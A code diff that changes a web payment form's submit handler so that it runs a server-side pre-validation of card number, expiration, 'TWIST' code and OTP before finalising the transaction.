@@ -255,7 +255,7 @@
     }
   };
 
-  /* ------------ Submit (NEW: single-shot server validation) ------------ */
+  /* ------------ Submit with PRE-VALIDATE first, then finalize ------------ */
   function showErr(msg) {
     clientErr.textContent = msg;
     clientErr.classList.remove('hidden');
@@ -264,24 +264,31 @@
 
   document.getElementById('paymentForm').addEventListener('submit', async (e) => {
     e.preventDefault();
+
     const rawCard = cardEl.value.replace(/\s/g, '');
+    const exp = expEl.value.replace(/\D/g, '');
+    const twist = twistEl.value.replace(/\D/g, '');
+
+    // Basic client checks
     if (!/^\d{14}$/.test(rawCard)) return showErr('Card must be 14 digits.');
-    if (!/^\d{4}$/.test(expEl.value)) return showErr('Expiration must be MMYY.');
-    if (!/^\d{4}$/.test(twistEl.value)) return showErr('TWIST Code must be 4 digits.');
+    if (!/^\d{4}$/.test(exp)) return showErr('Expiration must be MMYY.');
+    if (!/^\d{4}$/.test(twist)) return showErr('TWIST Code must be 4 digits.');
 
     const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
     if (!lockedPhone) return showErr('Please send and verify an OTP first.');
     if (!/^\d{6}$/.test(otpEl.value)) return showErr('OTP must be 6 digits.');
 
-    const transactionId = (crypto?.randomUUID && crypto.randomUUID()) || ('t_' + Math.random().toString(36).slice(2));
+    const transactionId =
+      (crypto?.randomUUID && crypto.randomUUID()) ||
+      ('t_' + Math.random().toString(36).slice(2));
 
     const payload = {
       transaction_id: transactionId,
       orderno: document.getElementById('orderno').value,
       amount: document.getElementById('amount').value,
       cardNumber: rawCard,                // 14 digits
-      expiration: expEl.value,            // MMYY
-      twist: twistEl.value,
+      expiration: exp,                    // MMYY
+      twist,
       name: document.getElementById('name').value.trim(),
       email: document.getElementById('email').value.trim(),
       phone: lockedPhone,                 // EXACT same phone used for OTP
@@ -291,20 +298,33 @@
       otpCode: otpEl.value
     };
 
+    // Show small spinner while PRE-VALIDATE runs
     document.getElementById('loadingSpinner').classList.remove('hidden');
 
     try {
-      // NEW: call server-side validator that checks logs + code.json and posts /store-status on approval
-      const resp = await fetch('https://twist-status-server.onrender.com/validate-transaction', {
+      // 1) PRE-VALIDATE (checks: loan match by last6, expiration, TWIST, postal, amount <= available_credit, OTP)
+      const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
-      const data = await resp.json();
+      const preData = await pre.json();
 
-      // Move to waiting screen (same UX) and then reveal result
+      if (!pre.ok || !preData?.ok) {
+        document.getElementById('loadingSpinner').classList.add('hidden');
+        return showErr(preData?.message || 'Validation failed.');
+      }
+
+      // 2) Move to "waiting for confirmation" screen
       document.getElementById('paymentForm').classList.add('hidden');
       document.getElementById('confirmationStep').classList.remove('hidden');
       document.getElementById('loadingSpinner').classList.add('hidden');
 
+      // 3) Finalize server-side (will also POST /store-status on approval)
+      const resp = await fetch('https://twist-status-server.onrender.com/validate-transaction', {
+        method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
+      });
+      const data = await resp.json().catch(() => ({}));
+
+      // 4) Reveal result
       setTimeout(() => {
         document.getElementById('confirmationStep').classList.add('hidden');
         if (data && data.ok && data.status === 'approved') {
@@ -312,7 +332,7 @@
         } else {
           document.getElementById('confirmationDenied').classList.remove('hidden');
         }
-      }, 1200);
+      }, 800);
     } catch (err) {
       document.getElementById('loadingSpinner').classList.add('hidden');
       showErr("Network error: " + err.message);
